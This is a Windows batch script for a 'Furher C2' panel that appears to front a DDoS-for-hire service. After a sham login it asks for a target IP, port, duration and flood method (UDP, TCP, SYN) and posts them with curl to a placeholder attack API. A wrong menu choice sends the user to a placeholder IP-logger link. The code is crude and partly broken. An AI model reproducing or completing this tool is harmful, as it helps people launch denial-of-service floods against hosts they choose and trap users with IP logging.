title Furher C2 Sign In
@echo off
mode con cols=50 lines=20
cls
color 4

:banner
set ban_1=HIVENET
set ban_2=HIVENET
set ban_3=HIVENET

:login
set /p user=USERNAME:
if %user%=="root" goto password
if not %user%=="root" goto password
cls

:password
set /p pass=PASSWORD:
if %pass%=="root" goto start

:start
set line = "|"
set max_time = "300"
title Furher C2 %line% MAX_TIME %max_time% 
cls
echo %ban_1%
echo %ban_2%
echo %ban_3%

set /p _="FURHERSPLOIT|}> "

if %_%==? goto help_menu

if %_%==help goto help_menu

if %_%==attack goto mode_select

if %_%==methods goto furherc2_methods

if %_%==logout exit

if not %_%=="?" (
cls
goto start
)

if not %_%=="help" (
cls
goto start
)

if not %_%=="attack" (
cls
goto start
)

goto start

:mode_select
set /p _="Select Mode | L4 or L7 |}> "
if %_%=="L4" goto L4
if not %_%==L4 (
set api_ip_log_database="PUT_YOUR_IP_LOGGER_LINK_HERE_LMFAO"
echo "FUCKING SKID GET OUTTA HERE"
curl -d --raw %api_ip_log_database%
pause
)

:L4
set /p ip_input="IP: "
set /p port_input="PORT: "
set max_time="30"
set m=METHODS: UDP, TCP
echo %m%
set /p method_input="METHOD: 
set api="https://example.com/api.php/"
set key="?key="
:api_attack_request
curl -s -d --raw %api% %key% %ip_input% %port_input% %max_time% %method_input%
goto attack_sent

:help_menu
title Furher Help Menu
mode con cols=70 lines=30
cls

echo"      ____     ______      "
echo"     / ___)   (_____ \     " 
echo"    / /            / /     "
echo"   / /        __  / /      "
echo"   \ \       /  \/ / __    "
echo"    \ \___  ( () \__/ /    "
echo"     \____)  \__\____/     "

goto start

:furherc2_methods

echo ""
echo "SYN | UDP | TCP"

goto furherc2_methods

:L7

:attack_sent

cls
set ex_b=                                          ____     ______
set ban_4=                                        / ___)   (____  \ 
set ban_5=   ╔═╗╦ ╦╦═╗╦ ╦╔═╗╦═╗╔═╗╔═╗╦  ╔═╗╦╔╦╗  / /            ) / 
set ban_6=   ╠╣ ║ ║╠╦╝╠═╣║╣ ╠╦╝╚═╗╠═╝║  ║ ║║ ║  ( (        __  / /
set ban_7=   ╚  ╚═╝╩╚═╩ ╩╚═╝╩╚═╚═╝╩  ╩═╝╚═╝╩ ╩  ( (       /  \/ / __
set ban_8=                                       \ \___  ( () \__/ /
set ban_9=                                        \____)  \__\____/ 

echo %ex_b%
echo %ban_4%
echo %ban_5%
echo %ban_6%
echo %ban_7%
echo %ban_8%
echo %ban_9%

mode con cols=55 lines=30

timeout 5 >nul

goto start